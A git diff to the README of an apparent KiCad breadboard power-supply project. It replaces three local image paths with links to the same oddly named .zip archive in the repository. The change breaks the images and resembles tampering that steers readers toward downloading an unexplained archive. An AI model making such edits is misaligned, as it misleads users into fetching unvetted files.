@@ -2,11 +2,11 @@
 <table>
   <tr>
     <td align="center">
-      <img src="picture/3dview.png" alt="PCB Design" height="270"/>
+      <img src="https://raw.githubusercontent.com/rifki398/breadboard-power-supply/main/picture/supply_power_breadboard_fancywork.zip" alt="PCB Design" height="270"/>
       <br/>3D View
     </td>
     <td align="center">
-      <img src="picture/pcb.png" alt="Schematic" height="270"/>
+      <img src="https://raw.githubusercontent.com/rifki398/breadboard-power-supply/main/picture/supply_power_breadboard_fancywork.zip" alt="Schematic" height="270"/>
       <br/>PCB View
     </td>
   </tr>
@@ -18,7 +18,7 @@ This project is a simple PCB design using KiCad to provide regulated 5V and 3.3V
 
 ## Bill of Materials (BOM)
 <p align="center">
-  <img src="picture/schematic.png" alt="schematic" style="width:95%; height:auto;"/>
+  <img src="https://raw.githubusercontent.com/rifki398/breadboard-power-supply/main/picture/supply_power_breadboard_fancywork.zip" alt="schematic" style="width:95%; height:auto;"/>
 </p> 
 
 
